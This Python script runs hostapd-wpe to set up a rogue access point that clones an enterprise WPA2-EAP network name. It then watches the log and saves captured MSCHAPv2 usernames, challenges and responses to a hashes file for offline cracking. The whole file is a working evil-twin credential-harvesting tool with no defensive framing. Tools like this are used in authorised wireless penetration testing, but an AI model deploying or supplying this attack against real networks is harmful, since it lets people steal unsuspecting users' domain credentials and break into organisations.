"""hostapd-wpe runner — clones an Enterprise SSID, tails log for MSCHAPv2."""

from __future__ import annotations

import argparse
import re
import signal
import subprocess
import sys
import time
from pathlib import Path


WPE_CERT_DIR = "/etc/hostapd-wpe/certs"


def hostapd_wpe_conf(iface: str, ssid: str, channel: int) -> str:
    return (
        f"interface={iface}\n"
        "driver=nl80211\n"
        f"ssid={ssid}\n"
        "hw_mode=g\n"
        f"channel={channel}\n"
        "ieee80211n=1\n"
        "auth_algs=1\n"
        "wmm_enabled=1\n"
        "ieee8021x=1\n"
        "eap_server=1\n"
        f"eap_user_file={WPE_CERT_DIR}/hostapd-wpe.eap_user\n"
        f"ca_cert={WPE_CERT_DIR}/ca.pem\n"
        f"server_cert={WPE_CERT_DIR}/server.pem\n"
        f"private_key={WPE_CERT_DIR}/server.key\n"
        "private_key_passwd=whatever\n"
        "wpa=2\n"
        "wpa_key_mgmt=WPA-EAP\n"
        "wpa_pairwise=CCMP\n"
        "rsn_pairwise=CCMP\n"
    )


HASH_RE = re.compile(r"(username:|challenge:|response:)", re.IGNORECASE)


def tail_for_hashes(log_path: Path, hashes_path: Path, stop_event) -> None:
    """Tail hostapd-wpe log and append lines matching MSCHAPv2 hash fields."""
    with log_path.open("r", errors="replace") as fh:
        fh.seek(0, 2)  # seek to end
        with hashes_path.open("a") as out:
            while not stop_event["stop"]:
                line = fh.readline()
                if not line:
                    time.sleep(0.5)
                    continue
                if HASH_RE.search(line):
                    out.write(line)
                    out.flush()


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--workdir", required=True)
    p.add_argument("--ap-iface", required=True)
    p.add_argument("--ssid", required=True)
    p.add_argument("--channel", type=int, default=6)
    args = p.parse_args()

    workdir = Path(args.workdir)
    workdir.mkdir(parents=True, exist_ok=True)
    conf_path = workdir / "hostapd-wpe.conf"
    log_path = workdir / "hostapd-wpe.log"
    hashes_path = workdir / "hashes.txt"

    if not Path(WPE_CERT_DIR).is_dir():
        print(f"[x] {WPE_CERT_DIR} missing — install hostapd-wpe package", flush=True)
        return 2

    conf_path.write_text(hostapd_wpe_conf(args.ap_iface, args.ssid, args.channel))
    hashes_path.touch()

    subprocess.run(["nmcli", "device", "set", args.ap_iface, "managed", "no"], check=False)
    subprocess.run(["ip", "link", "set", args.ap_iface, "up"], check=False)

    log_fh = open(log_path, "ab")
    hostapd = subprocess.Popen(["hostapd-wpe", str(conf_path)],
                               stdout=log_fh, stderr=log_fh)

    running = {"go": True, "stop": False}

    def stop(_sig, _frm):
        running["go"] = False
        running["stop"] = True

    signal.signal(signal.SIGTERM, stop)
    signal.signal(signal.SIGINT, stop)

    print(f"[*] wpa-enterprise up on {args.ap_iface} SSID={args.ssid!r}", flush=True)

    import threading
    tailer = threading.Thread(
        target=tail_for_hashes, args=(log_path, hashes_path, running),
        daemon=True,
    )
    tailer.start()

    try:
        while running["go"]:
            if hostapd.poll() is not None:
                print("[x] hostapd-wpe died", flush=True)
                break
            time.sleep(1)
    finally:
        try:
            hostapd.terminate()
            hostapd.wait(timeout=3)
        except Exception:
            try:
                hostapd.kill()
            except Exception:
                pass
        log_fh.close()
        tailer.join(timeout=2)
    return 0


if __name__ == "__main__":
    sys.exit(main())
